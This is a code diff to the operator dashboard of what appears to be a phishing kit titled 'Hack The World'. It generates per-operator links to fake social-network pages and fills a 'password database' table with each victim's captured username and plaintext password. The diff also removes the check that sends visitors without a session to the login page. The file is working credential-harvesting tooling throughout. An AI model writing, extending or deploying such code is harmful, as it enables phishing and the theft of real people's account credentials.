@@ -1,8 +1,15 @@
-import { dbUrl } from "./variables.js";
+import { dbUrl, domain } from "./variables.js";
 
 const user = JSON.parse(sessionStorage.getItem("user"));
 
-if (!user) window.location.href = "./login.html";
+
+// getting user details from database
+
+let userFromDb = await fetch(
+  `${dbUrl}/users?name=${user.name}&email=${user.email}`
+);
+userFromDb = await userFromDb.json();
+userFromDb = userFromDb[0];
 
 // logout
 
@@ -38,11 +45,12 @@ function copyStringToClipboard(str) {
 
 let copyBtn = document.querySelector(".copy-btn");
 copyBtn.addEventListener("click", (e) => {
-  let link = e.target.getAttribute("data-link");
+  let social = e.target.getAttribute("data-social");
+  let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;
 
-  copyStringToClipboard(link).then(()=>{
-    swal("Hack The World 🌎", "Link copied successfully", "success")
-  })
+  copyStringToClipboard(link).then(() => {
+    swal("Hack The World 🌎", "Link copied successfully", "success");
+  });
 });
 
 // dom
@@ -51,19 +59,13 @@ document.getElementById("user-name").innerText = user.name;
 
 // password database setup
 
-
 const getUserDetail = async () => {
-
-  let passwordDb = document.getElementById("password-db")
-
-  let userFromDb = await fetch(`${dbUrl}/users?name=${user.name}&email=${user.email}`);
-  userFromDb = await userFromDb.json();
-  userFromDb = userFromDb[0]
+  let passwordDb = document.getElementById("password-db");
 
   let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
-  targets = await targets.json()
+  targets = await targets.json();
 
-  targets.map(victim => {
+  targets.map((victim) => {
     passwordDb.innerHTML += `
       <tr>
         <th scope="row">🤵</th>
@@ -71,10 +73,8 @@ const getUserDetail = async () => {
         <td>${victim.username}</td>
         <td>${victim.password}</td>
       </tr>
-    `
+    `;
   });
+};
 
-}
-
-
-getUserDetail()
+getUserDetail();
